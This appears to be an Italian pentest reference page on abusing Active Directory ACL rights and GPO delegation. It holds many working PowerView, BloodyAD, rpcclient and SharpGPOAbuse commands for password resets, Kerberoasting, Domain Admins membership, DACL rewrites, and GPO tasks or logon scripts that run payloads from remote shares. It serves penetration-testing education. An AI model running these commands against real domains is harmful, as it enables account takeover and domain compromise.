# Abuso di Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è per lo più un riepilogo delle tecniche da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consultare gli articoli originali.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Diritti GenericAll su un utente**

Questo privilegio concede a un attacker il controllo completo su un account utente target. Una volta che i diritti `GenericAll` sono confermati usando il comando `Get-ObjectAcl`, un attacker può:

- **Cambiare la password del target**: Usando `net user <username> <password> /domain`, l'attacker può reimpostare la password dell'utente.
- **Targeted Kerberoasting**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, poi usare Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilitare pre-authentication per l'utente, rendendo il loro account vulnerabile ad ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Rights on Group**

Questo privilegio permette a un attaccante di manipolare le appartenenze ai gruppi se dispone dei diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il distinguished name del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando possiedi l'appartenenza GenericAll/Write su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente accesso WinRM sugli host che rispettano quel gruppo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Il possesso di questi privilegi su un oggetto computer o su un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: Permette di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: Consente di impersonare un computer o un account utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty on Group**

Se un utente ha i diritti `WriteProperty` su tutti gli oggetti di un gruppo specifico (es. `Domain Admins`), può:

- **Aggiungersi al gruppo Domain Admins**: Realizzabile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation di privilegi all'interno del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Questo privilegio consente agli attaccanti di aggiungere se stessi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza al gruppo. L'uso della seguente sequenza di comandi permette l'auto-aggiunta:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà dei gruppi se hanno il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono effettuate con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Il possesso dell'`ExtendedRight` su un utente per `User-Force-Change-Password` consente il reset della password senza conoscere quella corrente. La verifica di questo diritto e il suo sfruttamento possono essere effettuati tramite PowerShell o altri strumenti da riga di comando, offrendo diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liners per ambienti non interattivi. I comandi spaziano da semplici invocazioni di PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su un gruppo**

Se un attaccante scopre di avere i diritti `WriteOwner` su un gruppo, può trasferire la proprietà del gruppo a sé stesso. Questo è particolarmente rilevante quando il gruppo in questione è `Domain Admins`, poiché cambiare il proprietario consente un controllo più ampio sugli attributi del gruppo e sui suoi membri. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e quindi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che mediante nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Questa autorizzazione permette a un attacker di modificare le proprietà dell'utente. Nello specifico, con accesso `GenericWrite` l'attacker può cambiare il percorso dello script di logon di un utente per eseguire uno script malevolo al momento del logon dell'utente. Questo si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target in modo che punti allo script dell'attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo comporta la creazione di un oggetto credenziale, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche all'appartenenza con comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possedere un AD object e avere i privilegi `WriteDACL` su di esso consente a un attacker di concedersi privilegi `GenericAll` sull'oggetto. Questo viene ottenuto tramite manipolazione ADSI, permettendo il controllo completo sull'oggetto e la possibilità di modificare le sue membership di gruppo. Nonostante ciò, esistono limitazioni nel tentativo di sfruttare questi privilegi usando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replica nel Dominio (DCSync)**

L'attacco DCSync sfrutta permessi di replica specifici nel dominio per mimare un Domain Controller e sincronizzare i dati, incluse le credenziali utente. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, che permettono agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato per gestire Group Policy Objects (GPO) può comportare rischi di sicurezza significativi. Per esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione delle GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Questi permessi possono essere abusati per scopi malevoli, come identificabile con PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerare i permessi delle GPO

Per identificare GPO mal configurate, i cmdlet di PowerSploit possono essere concatenati. Questo permette di scoprire le GPO che un utente specifico può gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer a cui è applicata una data GPO**: È possibile risolvere quali computer sono interessati da una specifica GPO, aiutando a comprendere l'ambito dell'impatto potenziale. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policy applicate a un dato computer**: Per vedere quali policy sono applicate a un determinato computer, si possono usare comandi come `Get-DomainGPO`.

**OU a cui è applicata una data policy**: Identificare le organizational units (OU) interessate da una data policy può essere fatto usando `Get-DomainOU`.

Puoi anche usare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare le GPO e trovare problemi in esse.

### Abuso delle GPO - New-GPOImmediateTask

GPO mal configurate possono essere sfruttate per eseguire codice, per esempio creando un scheduled task immediato. Questo può essere usato per aggiungere un utente al gruppo degli amministratori locali sulle macchine interessate, elevando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il GroupPolicy module, se installato, permette la creazione e il collegamento di nuovi GPOs e l'impostazione di preferenze come registry values per eseguire backdoors sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente acceda al computer affinché avvenga l'esecuzione:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre un metodo per abusare di GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica di GPO esistenti o l'uso degli strumenti RSAT per crearne di nuovi prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Aggiorna la Policy forzatamente

Gli aggiornamenti delle GPO avvengono tipicamente ogni circa 90 minuti. Per accelerare questo processo, specialmente dopo aver apportato una modifica, sul computer target può essere eseguito il comando `gpupdate /force` per forzare un aggiornamento immediato delle policy. Questo comando assicura che le modifiche alle GPO vengano applicate senza attendere il prossimo ciclo automatico di aggiornamento.

### Sotto il cofano

Ispezionando le Scheduled Tasks per una data GPO, come la `Misconfigured Policy`, si può confermare l'aggiunta di task come `evilTask`. Queste attività vengono create tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o scalare privilegi.

La struttura della task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli della scheduled task — incluso il comando da eseguire e i suoi trigger. Questo file rappresenta come le attività pianificate sono definite e gestite all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.

### Utenti e Gruppi

Le GPO consentono anche la manipolazione delle membership di utenti e gruppi sui sistemi target. Modificando direttamente i file di policy Users and Groups, un attaccante può aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Questo è possibile grazie alla delega delle autorizzazioni di gestione delle GPO, che permette di modificare i file di policy per includere nuovi utenti o cambiare le membership dei gruppi.

Il file di configurazione XML per Users and Groups illustra come queste modifiche vengono implementate. Aggiungendo voci a questo file, utenti specifici possono ottenere privilegi elevati sui sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi tramite la manipolazione delle GPO.

Inoltre, si possono considerare ulteriori metodi per eseguire codice o mantenere la persistenza, come sfruttare script di logon/logoff, modificare chiavi del registro per autoruns, installare software tramite file .msi o modificare le configurazioni dei servizi. Queste tecniche offrono varie vie per mantenere l'accesso e controllare i sistemi target attraverso l'abuso delle GPO.

## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
